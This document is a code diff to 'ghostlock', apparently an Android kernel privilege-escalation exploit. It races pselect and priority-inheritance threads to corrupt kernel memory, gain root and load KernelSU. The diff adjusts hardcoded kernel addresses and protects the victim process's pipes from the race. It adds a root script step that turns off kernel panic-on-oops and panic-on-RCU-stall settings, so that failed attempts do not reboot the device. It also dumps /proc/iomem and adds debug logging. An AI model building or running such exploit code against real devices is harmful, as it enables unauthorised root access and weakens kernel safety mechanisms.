@@ -1,0 +1,177 @@
+diff --git a/src/Makefile b/src/Makefile
+index dc863d6..38340f8 100644
+--- a/src/Makefile
++++ b/src/Makefile
+@@ -61,7 +61,7 @@ TARGET_CONFIG ?= kernel/target.h
+ 
+ COMMON_FLAGS := -O2 -flto -Wall -Wextra -Wconversion -Wsign-conversion \
+   -Wno-unused-parameter -Wno-sign-compare -Wno-unused-function \
+-  -Icore -DTARGET_CONFIG_H=\"$(TARGET_CONFIG)\"
++  -Icore -DTARGET_CONFIG_H=\"$(TARGET_CONFIG)\" -D__BIONIC_NO_PAGE_SIZE_MACRO
+ CFLAGS := $(COMMON_FLAGS) -std=gnu11
+ CXXFLAGS := $(COMMON_FLAGS) -std=c++23 -fno-rtti
+ LDFLAGS := -fPIE -pie -pthread -flto -static-libstdc++
+diff --git a/src/core/attack/ops.cpp b/src/core/attack/ops.cpp
+index 4e38f0a..e0892c8 100644
+--- a/src/core/attack/ops.cpp
++++ b/src/core/attack/ops.cpp
+@@ -267,6 +267,17 @@ namespace ghostlock::attack {
+             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
+             "  exit 1\n"
+             "fi\n"
++            /* A failed pselect race can leave an RCU stall (or an oops) behind, and
++             * Android's panic_on_rcu_stall=1 turns that into an instant reboot.
++             * Lower both once root is ours so later attempts in this boot die
++             * quietly instead of rebooting the device. */
++            "for k in panic_on_rcu_stall panic_on_oops panic_on_warn \\\n"
++            "         hardlockup_panic softlockup_panic hung_task_panic; do\n"
++            "  if [ -w \"/proc/sys/kernel/$k\" ]; then\n"
++            "    echo 0 >\"/proc/sys/kernel/$k\" 2>/dev/null && \\\n"
++            "      echo \"[*] $k=$(cat /proc/sys/kernel/$k)\" >>\"$LOG\"\n"
++            "  fi\n"
++            "done\n"
+             /* the rename is atomic, so a failed read leaves the old dump in place */
+             "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
+             "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
+@@ -395,6 +406,12 @@ namespace ghostlock::attack {
+             "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
+             "fi\n"
+             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
++            /* 给 App 看的存活标记：带 boot_id，重启后自动失效 */
++            /* 注意：整段脚本是 snprintf 的 format，字面 % 必须写成 %% */
++            "printf '%%s %%s %%s\\n' \"$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)\" \\\n"
++            "  \"$(date +%%s)\" \"$(grep -c '^kernelsu ' /proc/modules 2>/dev/null)\" \\\n"
++            "  >\"$HOME_DIR/.ghostlock_status\" 2>/dev/null\n"
++            "chmod 644 \"$HOME_DIR/.ghostlock_status\" 2>/dev/null\n"
+             "KSU_READY=0\n"
+             "for i in $(seq 1 50); do\n"
+             "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
+@@ -421,6 +438,13 @@ namespace ghostlock::attack {
+             pr_warning("root script too long\n");
+             return;
+         }
++        /* 这段脚本是 snprintf 的 format：任何字面 % 都必须写成 %%。写漏了不会报错，
++         * 只会把后面的 varargs 当格式符吃掉（以前就因此崩在生成脚本这一步）。
++         * 这里做一次结果自检，至少能在日志里看出来。 */
++        if (strstr(script.data(), "KernelSU module loaded") == nullptr ||
++            static_cast<size_t>(n) == 0 || script.data()[static_cast<size_t>(n) - 1] != '\n') {
++            pr_warning("root script malformed (n=%d): check %% escaping in ops.cpp\n", n);
++        }
+         if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
+             pr_warning("write root script failed errno=%d\n", errno);
+         }
+diff --git a/src/core/kernel/target_constants.hpp b/src/core/kernel/target_constants.hpp
+index ed37b5e..3009dd3 100644
+--- a/src/core/kernel/target_constants.hpp
++++ b/src/core/kernel/target_constants.hpp
+@@ -9,7 +9,7 @@
+ 
+ namespace ghostlock::target {
+     namespace address {
+-        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
++        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc008000000ULL;
+         inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
+         inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
+         inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
+@@ -75,7 +75,7 @@ namespace ghostlock::target {
+     static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
+     static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));
+ 
+-    static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
++    static_assert(address::kImageTextBase == 0xffffffc008000000ULL);
+     static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
+     static_assert(address::kPageOffset == address::kDirectMapBase);
+     static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
+diff --git a/src/core/main.cpp b/src/core/main.cpp
+index 2e46914..3ca6cb6 100644
+--- a/src/core/main.cpp
++++ b/src/core/main.cpp
+@@ -26,6 +26,10 @@ using namespace ghostlock;
+ 
+ 
+ int main(int argc, char **argv) {
++    /* Line-buffer stdout: when the run is redirected to a file and the race
++     * wedges the process (SIGKILL by the caller), a block-buffered tail loses
++     * the last few KB and the hang point cannot be located. */
++    (void) setvbuf(stdout, nullptr, _IOLBF, 0);
+     try {
+         profile::kernel_offsets decoded = {};
+         std::array<char, 256> release_buf{};
+diff --git a/src/core/race/threads.cpp b/src/core/race/threads.cpp
+index bfc225f..7c03aae 100644
+--- a/src/core/race/threads.cpp
++++ b/src/core/race/threads.cpp
+@@ -216,7 +216,9 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
+ namespace ghostlock::race {
+     /* Create, synchronize, stop and join one explicitly owned PI race. */
+     Status run_main_route_threads(const memory::WriteRequest &request) {
++        pr_info("[route] reset begin\n");
+         reset_main_route_state();
++        pr_info("[route] reset done\n");
+         pr_info("[route] creating waiter/owner/consumer\n");
+         int32_t error = session::g_exploit_session.race.start_threads(
+             waiter_thread, owner_thread, consumer_thread, &request);
+diff --git a/src/core/session/victim_process.cpp b/src/core/session/victim_process.cpp
+index 003c9d6..aaf91ab 100644
+--- a/src/core/session/victim_process.cpp
++++ b/src/core/session/victim_process.cpp
+@@ -166,6 +166,16 @@ namespace ghostlock::session::victim {
+         park_child_process_forever();
+     }
+ 
++    /* Move a pipe end above the select route's fd window. The route dup2()s and
++ * later close()s fds 3..PSELECT_ROUTE_NFDS-1 that its crafted fd_sets mark as
++ * owned, which would otherwise destroy these victim pipes when the process has
++ * few open fds (e.g. an adb shell run rather than the app process). */
++    static void raise_pipe_fd(ghostlock::support::UniqueFd &fd) {
++        if (!fd.valid()) return;
++        const int32_t high = fcntl(fd.get(), F_DUPFD, 400);
++        if (high >= 0) fd.reset(high);
++    }
++
+     static pid_t spawn_child(VictimContext &p) {
+         std::array<int32_t, 2> p1{}, p2{}, p3{};
+         if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
+@@ -175,6 +185,12 @@ namespace ghostlock::session::victim {
+         p.cmd_write.reset(p2[1]);
+         p.uid_read.reset(p3[0]);
+         p.uid_write.reset(p3[1]);
++        raise_pipe_fd(p.task_read);
++        raise_pipe_fd(p.task_write);
++        raise_pipe_fd(p.cmd_read);
++        raise_pipe_fd(p.cmd_write);
++        raise_pipe_fd(p.uid_read);
++        raise_pipe_fd(p.uid_write);
+         pid_t child = fork();
+         if (child < 0) return -1;
+         if (child == 0) {
+@@ -185,6 +201,8 @@ namespace ghostlock::session::victim {
+         p.cmd_read.reset();
+         p.uid_write.reset();
+         p.set_child(child);
++        pr_info("victim fds cmd_w=%d uid_r=%d task_r=%d pid=%d\n",
++                p.cmd_write.get(), p.uid_read.get(), p.task_read.get(), child);
+         return child;
+     }
+ 
+@@ -210,11 +228,17 @@ namespace ghostlock::session::victim {
+ 
+     int32_t verify_w2_stage(void *context) {
+         auto *stage = static_cast<struct w2_stage_context *>(context);
+-        if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
++        const ssize_t cw = write(stage->pipes.cmd_write.get(), "C", 1);
++        if (cw != 1) {
++            pr_warning("W2 verify: cmd write ret=%zd errno=%d fd=%d\n", cw, errno,
++                       stage->pipes.cmd_write.get());
++            return 0;
++        }
+ 
+         uint32_t child_uid = 9999;
+-        if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
+-            static_cast<ssize_t>(sizeof(child_uid))) {
++        const ssize_t rd = read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid));
++        if (rd != static_cast<ssize_t>(sizeof(child_uid))) {
++            pr_warning("W2 verify: uid read ret=%zd errno=%d seen=%u\n", rd, errno, child_uid);
+             return 0;
+         }
+         pr_info("child uid = %u\n", child_uid);
